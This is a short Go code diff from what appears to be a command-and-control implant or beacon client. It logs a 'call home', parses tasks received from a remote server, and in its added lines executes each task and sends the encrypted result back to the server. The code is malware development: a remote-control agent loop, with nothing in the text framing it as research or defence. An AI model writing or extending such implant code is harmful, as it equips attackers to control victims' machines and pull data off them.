@@ -22,7 +22,7 @@ func Init() error {
 	mt := metadata.New()
 	log.Printf("client Id %d", mt.ClientId)
 
-	req := requester.New()
+	req := requester.New(int(mt.ClientId))
 
 	b, err := firstBlood(enc, mt, &req)
 	if err != nil {
@@ -47,7 +47,7 @@ func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) e
 		if err != nil {
 			return err
 		}
-		//log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)
+		log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)
 
 		if resp.ContentLength > 0 {
 			body, err := io.ReadAll(resp.Body)
@@ -62,7 +62,7 @@ func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) e
 				return err
 			}
 
-			timestamp := tasks[:4]
+			//timestamp := tasks[:4]
 			lenDataB := tasks[4:8]
 			lenData := binary.BigEndian.Uint32(lenDataB)
 			tasksBuf := bytes.NewBuffer(tasks[8:])
@@ -75,7 +75,16 @@ func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) e
 				if err != nil {
 					return err
 				}
+
+				rtype,resp := Task(cmdType, data)
+				pack, err := metadata.PackResp(enc, int(rtype), resp)
+				if err != nil {return err}
+
+				postResp, err := sendResult(r, pack)
+				if err != nil {return err}
 				
+				log.Printf("data sent url=%s st=%d cl=%d\n", 
+					postResp.Request.URL, postResp.StatusCode, postResp.ContentLength)
 			}
 
 		}
